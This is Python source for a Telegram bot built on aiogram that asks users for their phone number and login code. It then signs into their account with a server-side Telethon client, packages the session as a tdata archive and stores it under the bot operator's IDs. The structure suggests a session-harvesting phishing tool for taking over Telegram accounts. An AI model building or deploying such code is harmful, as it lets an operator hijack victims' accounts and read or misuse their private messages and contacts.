from aiogram import types, Router
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext

from app.keyboards.main import main_kb
from app.services.text_service import get_text
from app.services.telethon_service import create_client
from app.services.tdata_service import to_tdata
from app.services.session_service import save_session

router = Router()

class Auth(StatesGroup):
    phone = State()
    code = State()

def register_handlers(dp, bot_id, owner_id):
    dp.include_router(router)
    router.bot_id = bot_id
    router.owner_id = owner_id

@router.message(CommandStart())
async def start(msg: types.Message):
    text = await get_text(router.bot_id, "start")
    await msg.answer(text, reply_markup=main_kb())

@router.message(lambda m: m.text == "📱 Login")
async def ask_phone(msg: types.Message, state: FSMContext):
    text = await get_text(router.bot_id, "phone_request")
    await msg.answer(text)
    await state.set_state(Auth.phone)

@router.message(Auth.phone)
async def get_phone(msg: types.Message, state: FSMContext):
    await state.update_data(phone=msg.text)
    text = await get_text(router.bot_id, "code_request")
    await msg.answer(text)
    await state.set_state(Auth.code)

@router.message(Auth.code)
async def get_code(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data["phone"]
    code = msg.text
    user_id = msg.from_user.id

    client, path = await create_client(
        router.owner_id,
        router.bot_id,
        user_id
    )

    try:
        await client.sign_in(phone, code)

        zip_file = await to_tdata(
            client,
            router.owner_id,
            router.bot_id,
            user_id
        )

        await save_session(router.bot_id, user_id, path)

        text = await get_text(router.bot_id, "success")
        await msg.answer(text)
        await msg.answer_document(types.FSInputFile(zip_file))

    except Exception:
        text = await get_text(router.bot_id, "error")
        await msg.answer(text)

    await client.disconnect()
    await state.clear()
